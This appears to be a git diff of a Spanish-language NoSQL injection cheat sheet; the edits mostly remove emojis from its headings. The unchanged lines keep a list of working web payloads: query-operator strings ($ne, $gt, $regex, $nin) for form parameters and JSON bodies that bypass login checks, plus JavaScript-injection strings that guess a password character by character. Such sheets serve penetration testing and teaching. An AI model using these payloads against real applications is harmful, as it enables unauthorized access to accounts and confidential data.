@@ -3,19 +3,19 @@
 ### 💥 **NoSQL Injection Cheat Sheet** 💥
 
 ---
-
-#### 📝 **¿Qué es una inyección NoSQL?**  
+---
+#### **¿Qué es una inyección NoSQL?**  
 
 Las **inyecciones NoSQL** son vulnerabilidades de seguridad que afectan aplicaciones web que utilizan bases de datos NoSQL, como **MongoDB**, **Cassandra** y **CouchDB**.  
 El atacante envía **datos maliciosos a través de una consulta** que se ejecuta sin validación o sanitización adecuada, logrando:  
 
-- 📂 **Acceso no autorizado a información confidencial.**  
-- ✏️ **Modificación de datos** en la base de datos.  
-- 🔧 **Ejecución de acciones no deseadas** en el sistema.  
+- **Acceso no autorizado a información confidencial.**  
+- **Modificación de datos** en la base de datos.  
+- **Ejecución de acciones no deseadas** en el sistema.  
 
 ---
 
-## 💡 **Diferencia entre SQLi y NoSQLi**  
+## **Diferencia entre SQLi y NoSQLi**  
 | Aspecto               | SQL Injection                           | NoSQL Injection                        |
 |-----------------------|-----------------------------------------|-----------------------------------------|
 | Tipo de Base de Datos | Relacional (SQL)                         | No Relacional (NoSQL)                    |
@@ -25,9 +25,9 @@ El atacante envía **datos maliciosos a través de una consulta** que se ejecuta
 
 ---
 
-### 💥 **Payloads para inyección NoSQL**
+### **Payloads para inyección NoSQL**
 
-#### 🗃️ **Payloads en Parámetros (Data)**
+#### **Payloads en Parámetros (Data)**
 ```bash
 username[$ne]=toto&password[$ne]=toto
 login[$regex]=a.*&pass[$ne]=lol
@@ -35,7 +35,7 @@ login[$gt]=admin&login[$lt]=test&pass[$ne]=1
 login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
 ```
 
-#### 🧪 **Payloads de Prueba (Testing)**
+#### **Payloads de Prueba (Testing)**
 ```bash
 '
 ' + '
@@ -48,9 +48,9 @@ administrator' && this.password[0] == 'k' || 'a'=='b   # URL encoded
 
 ---
 
-### 📝 **Payloads en JSON**
+### **Payloads en JSON**
 
-#### 📋 **Evasión de Restricciones**
+#### **Evasión de Restricciones**
 ```json
 {"username": {"$ne": null}, "password": {"$ne": null}}
 {"username": {"$ne": "bar"}}
@@ -58,7 +58,7 @@ administrator' && this.password[0] == 'k' || 'a'=='b   # URL encoded
 {"username": {"$gt":""}, "password": {"$gt":""}}
 ```
 
-#### 🔑 **Consultas Avanzadas**
+#### **Consultas Avanzadas**
 ##### **Comprobar longitud de la contraseña:**
 ```json
 {
@@ -107,7 +107,6 @@ administrator' && this.password[0] == 'k' || 'a'=='b   # URL encoded
 ```
 
 ---
-
 ### 🔗 **Recursos adicionales:**
 - Repositorio de Payloads:  
   [PayloadsAllTheThings - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
